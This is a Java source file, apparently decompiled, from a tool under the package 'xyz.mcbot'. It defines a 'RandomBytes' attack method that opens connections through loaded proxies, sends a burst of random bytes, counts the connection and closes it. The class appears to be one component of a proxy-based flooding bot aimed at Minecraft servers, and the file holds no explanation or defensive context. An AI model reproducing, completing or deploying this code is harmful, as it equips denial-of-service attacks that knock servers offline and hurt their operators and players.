package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelConfig;
import io.netty.channel.ChannelOption;
import java.security.SecureRandom;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;

public class RandomBytes
  implements Method
{
  private static final SecureRandom RANDOM = new SecureRandom();
  
  public RandomBytes() {}
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    byte[] bytes = new byte[4 + RANDOM.nextInt(128)];
    RANDOM.nextBytes(bytes);
    channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
    bytes = null;
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    if (RANDOM.nextBoolean()) {
      channel.config().setOption(ChannelOption.SO_LINGER, Integer.valueOf(1));
    }
    channel.close();
  }
}
